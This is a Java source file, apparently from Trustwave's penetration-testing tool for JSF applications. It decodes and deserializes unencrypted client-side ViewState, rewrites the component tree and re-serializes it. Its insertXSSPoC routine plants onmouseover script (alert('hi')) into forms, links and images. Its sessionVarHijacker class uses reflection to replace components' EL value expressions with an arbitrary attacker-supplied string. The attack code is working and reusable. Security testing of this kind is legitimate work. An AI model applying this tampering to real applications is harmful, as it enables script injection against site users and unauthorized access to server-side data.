/*******************************************************************************
 * Copyright (c) 2010 Trustwave Holdings, Inc.
 *******************************************************************************/

package com.trustwave.deface.viewstate;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.StringWriter;
import java.io.Writer;
import java.lang.reflect.Field;
import java.util.zip.GZIPInputStream;

import javax.el.ELContext;
import javax.el.ValueExpression;
import javax.faces.FactoryFinder;
import javax.faces.application.Application;
import javax.faces.application.StateManager;
import javax.faces.application.ViewHandler;
import javax.faces.component.UIComponentBase;
import javax.faces.component.UIViewRoot;
import javax.faces.component.html.*;
import javax.faces.context.ExternalContext;
import javax.faces.context.FacesContext;
import javax.faces.context.ResponseWriter;
import javax.faces.lifecycle.Lifecycle;
import javax.faces.render.RenderKit;
import javax.faces.render.RenderKitFactory;
import javax.faces.render.ResponseStateManager;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.codec.binary.Base64InputStream;
import org.apache.el.ValueExpressionImpl;
import org.apache.jasper.el.JspValueExpression;
import org.apache.myfaces.application.jsp.JspStateManagerImpl;
import org.apache.myfaces.application.jsp.JspViewHandlerImpl;
import org.apache.myfaces.config.FacesConfigurator;
import org.apache.myfaces.renderkit.RenderKitFactoryImpl;
import org.apache.myfaces.renderkit.html.HtmlResponseStateManager;
import org.apache.myfaces.shared_impl.renderkit.html.HtmlResponseWriterImpl;
import org.apache.myfaces.shared_impl.util.StateUtils;
import org.apache.shale.test.mock.*;

import com.trustwave.deface.utils.ObjectDumper;
import com.trustwave.deface.utils.WriteBehindStateWriter;

public class ViewStateWrapper
{
    public static final String COMPRESS_STATE_IN_CLIENT = StateUtils.INIT_PREFIX + "COMPRESS_STATE_IN_CLIENT";

	protected boolean compressViewState;
	protected final FacesContext facesContext;
	protected final ExternalContext externalContext;
	protected final ServletContext servletContext;
	protected final HttpServletRequest request;
	protected final HttpServletResponse response;
	protected final Lifecycle lifecycle;
	protected final UIViewRoot viewRoot;
	protected final Application application;
	protected final String rawViewState;
	protected final ViewHandler viewHandler;
	protected final StateManager stateManager;
	protected final StringWriter stateWriter;
	protected final HtmlResponseStateManager htmlResponseStateManager;
	
	
	public ViewStateWrapper(String rawViewState)
	{
		this.rawViewState = rawViewState;
		FactoryFinder.releaseFactories();
		FactoryFinder.setFactory(FactoryFinder.APPLICATION_FACTORY,
				"org.apache.shale.test.mock.MockApplicationFactory");
		FactoryFinder.setFactory(FactoryFinder.FACES_CONTEXT_FACTORY,
				"org.apache.shale.test.mock.MockFacesContextFactory");
		FactoryFinder.setFactory(FactoryFinder.LIFECYCLE_FACTORY,
				"org.apache.shale.test.mock.MockLifecycleFactory");
		FactoryFinder.setFactory(FactoryFinder.RENDER_KIT_FACTORY,
				"org.apache.shale.test.mock.MockRenderKitFactory");

		
		checkForGzip();
		servletContext = createMockServletContext();
		request = createMockHttpServletRequest();
		response = createMockHttpServletResponse();
		application = createMockApplication();
		externalContext = createMockExternalContext();
		viewHandler = createViewHandler();
		facesContext = createMockFacesContext();
		stateManager = createStateManager();
		application.setStateManager(stateManager);
		lifecycle = createMockLifecycle();
		stateWriter = createWriter();
		htmlResponseStateManager = createHtmlResponseStateManager();
		viewRoot = restoreView();
		facesContext.setViewRoot(viewRoot);
	}
	
	protected HtmlResponseStateManager createHtmlResponseStateManager()
	{
		return new HtmlResponseStateManager();
	}
	
	protected UIViewRoot restoreView()
	{
//        RuntimeConfig runtimeConfig = RuntimeConfig.getCurrentInstance(externalContext);
//		ApplicationImpl.setInitializingRuntimeConfig(runtimeConfig);

		// 1.2.x
//		FacesContextImpl facesContext = new FacesContextImpl(servletContext, request, response);

		UIViewRoot root =  viewHandler.restoreView(facesContext, getViewStateParamName());
		return root;
//		return (UIViewRoot) StateUtils.reconstruct(rawViewState, externalContext);
	}
	
	public String getViewStateParamName()
	{
		return ResponseStateManager.VIEW_STATE_PARAM;
	}
	
	protected StateManager createStateManager()
	{
		return new JspStateManagerImpl();
	}
	
	protected ViewHandler createViewHandler()
	{
		return new JspViewHandlerImpl();
	}
	protected MockLifecycle createMockLifecycle()
	{
		return new MockLifecycle();
	}
	
	protected MockFacesContext createMockFacesContext()
	{
		MockFacesContext mfc = new MockFacesContext(externalContext);
		((MockFacesContext) mfc).setApplication(application);
		mfc.getApplication().setViewHandler(viewHandler);
		mfc.getApplication().setStateManager(stateManager);
		return mfc;
	}
	
	protected StringWriter createWriter()
	{
		RenderKitFactory renderFactory = (RenderKitFactory) FactoryFinder.getFactory(FactoryFinder.RENDER_KIT_FACTORY);
        FacesConfigurator configurator = new FacesConfigurator(externalContext);
		configurator.configure();
		RenderKit renderKit = renderFactory.getRenderKit(facesContext, RenderKitFactory.HTML_BASIC_RENDER_KIT);
//		WriteBehindStateWriter wbsw = new WriteBehindStateWriter(facesContext, 100000);
		StringWriter sw = new StringWriter();
//		HtmlResponseWriterImpl hrwi = new HtmlResponseWriterImpl(sw, null, null);
		ResponseWriter newWriter = renderKit.createResponseWriter(sw, "text/html", null);
		facesContext.setResponseWriter(newWriter);
		return sw;
	}
	
	@SuppressWarnings("unchecked")
	protected MockExternalContext createMockExternalContext()
	{
		MockExternalContext ec = new MockExternalContext(servletContext, request, response);
		ec.getRequestParameterMap().put(getViewStateParamName(), rawViewState);;
		return ec;
	}
	
	protected MockApplication createMockApplication()
	{
		return new MockApplication();
	}
	
	protected MockHttpServletResponse createMockHttpServletResponse()
	{
		return new MockHttpServletResponse();
	}
	
	protected MockHttpServletRequest createMockHttpServletRequest()
	{
		MockHttpServletRequest r =  new MockHttpServletRequest();
		r.setPathElements("", "", "", "");
		r.addParameter(getViewStateParamName(), rawViewState);
		return r;
	}
	
	protected MockServletContext createMockServletContext()
	{
		MockServletContext msc = new MockServletContext();
		((MockServletContext) msc).addInitParameter(StateManager.STATE_SAVING_METHOD_PARAM_NAME, 
				StateManager.STATE_SAVING_METHOD_CLIENT);
		((MockServletContext) msc).addInitParameter(StateUtils.USE_ENCRYPTION, "false");
		((MockServletContext) msc).addInitParameter(COMPRESS_STATE_IN_CLIENT, String.valueOf(compressViewState));
		return msc;
	}
	
	public String generateServerSideTextTree()
	{
		return ObjectDumper.dumpObject(viewRoot, false);
	}
	
	public String generateRawTextTree()
	{
		StringBuffer buffer = new StringBuffer();
		ObjectInputStream ois;
		try
		{
			ois = initInputStream(this.rawViewState);
			try 
			{
				long stateTime = ois.readLong();
				buffer.append("State time stamp: " + stateTime + "\n\n");
			} 
			catch (IOException ioe) 
			{
				// no state time
			}
			
			buffer.append("Structure object: \n" + ObjectDumper.dumpObject(ois.readObject(), false) + "\n\n");
			buffer.append("State object: \n" + ObjectDumper.dumpObject(ois.readObject(), false));
		}
		catch (IOException e)
		{
			buffer.append("Problem reading view state: " + e.getLocalizedMessage());
		}
		catch (ClassNotFoundException e)
		{
			buffer.append("Class not found in view state: " + e.getLocalizedMessage());
		}
		
		return buffer.toString();
	}
	
	private ObjectInputStream initInputStream(String stateString) throws IOException
	{
		InputStream bis;
		if (compressViewState)
		{
			bis = new GZIPInputStream(new Base64InputStream(new ByteArrayInputStream(stateString.getBytes())));
		}
		else
		{
			bis = new Base64InputStream(new ByteArrayInputStream(stateString.getBytes()));
		}
		return new ObjectInputStream(bis);
	}
	
	private void checkForGzip()
	{
		try
		{
			new GZIPInputStream(new Base64InputStream(new ByteArrayInputStream(rawViewState.getBytes())));
			compressViewState = true;
		} 
		catch (Exception ioe) 
		{
			// assume input stream is not GZIP compressed)
			compressViewState = false;
		}
	}

	public void insertXSSPoC()
	{
		traverseView(viewRoot, new xsser());
	}

	
	protected void traverseView(UIComponentBase component, TreeCrawlAction action)
	{
		for (UIComponentBase child : component.getChildren().toArray(new UIComponentBase[0])) 
		{
			traverseView(child, action);
			action.handleNode(child);
		}		
	}
	
	
	private class xsser implements TreeCrawlAction
	{
		public void handleNode(UIComponentBase child)
		{
			if (child instanceof HtmlForm) {
				((HtmlForm) child).setOnmouseover("alert('hi')");
			}

			else if (child instanceof HtmlCommandLink) {
				((HtmlCommandLink) child).setOnmouseover("alert('hi')");
			}

			else if (child instanceof HtmlGraphicImage) {
				((HtmlGraphicImage) child).setOnmouseover("alert('hi')");
			}

			else if (child instanceof HtmlPanelGrid) {
				((HtmlPanelGrid) child).setOnmouseover("alert('hi')");
			}

			else {
				System.err.println("Unknown type");
			}
		}
	}


	private class sessionVarHijacker implements TreeCrawlAction
	{
		public sessionVarHijacker(String attack)
		{
			this.attack = "\n\n\n\n" + attack.replaceAll("\n", "\n\n\n") + "\n\n\n\n";
		}
		
		private final String attack;
		public void handleNode(UIComponentBase child)
		{
			ValueExpression expression = child.getValueExpression("value");
			if (expression != null)
			{
				if (expression instanceof JspValueExpression)
				{
					JspValueExpression jve = (JspValueExpression) expression;
					try
					{
						Field markField = JspValueExpression.class.getDeclaredField("mark");
						markField.setAccessible(true);
						String mark = (String) markField.get(jve);
						markField.set(jve, mark.replaceFirst("'.*'", "'" + attack + "'"));

						Field targetField = JspValueExpression.class.getDeclaredField("target");
						targetField.setAccessible(true);
						ValueExpressionImpl target = (ValueExpressionImpl) targetField.get(jve);
						
						Field exprField = ValueExpressionImpl.class.getDeclaredField("expr");
						exprField.setAccessible(true);
						exprField.set(target, attack);

					
					}
					catch (SecurityException e)
					{
						System.err.println("Huh??? " + e.getLocalizedMessage());
						e.printStackTrace();
						System.exit(1);
					}
					catch (NoSuchFieldException e)
					{
						System.err.println("Huh??? " + e.getLocalizedMessage());
						e.printStackTrace();
						System.exit(1);
					}
					catch (IllegalArgumentException e)
					{
						System.err.println("Huh??? " + e.getLocalizedMessage());
						e.printStackTrace();
						System.exit(1);
					}
					catch (IllegalAccessException e)
					{
						System.err.println("Huh??? " + e.getLocalizedMessage());
						e.printStackTrace();
						System.exit(1);
					}
				}
			}
		}
	}


	public void insertSessionVarsPoC(String attack)
	{
		traverseView(viewRoot, new sessionVarHijacker(attack));
	}

	public String serializeToString()
	{
		try
		{
//			viewHandler.writeState(facesContext);
//			viewHandler.renderView(facesContext, facesContext.getViewRoot());
            StringWriter sw = new StringWriter();
            ResponseWriter realWriter = facesContext.getResponseWriter();
            facesContext.setResponseWriter(realWriter.cloneWithWriter(sw));

            Object serializedView = stateManager.saveView(facesContext);

            stateManager.writeState(facesContext, serializedView);
            facesContext.setResponseWriter(realWriter);

            String state = sw.getBuffer().toString();
            String state2 = state.replaceFirst("[\\x00-\\xff]*value=\"([\\x00-\\xff]+)\"[\\x00-\\xff]*", "$1").replaceAll("[\r\n]", "");
            return state2;
		}
		catch (IOException e)
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return "";
	}
}
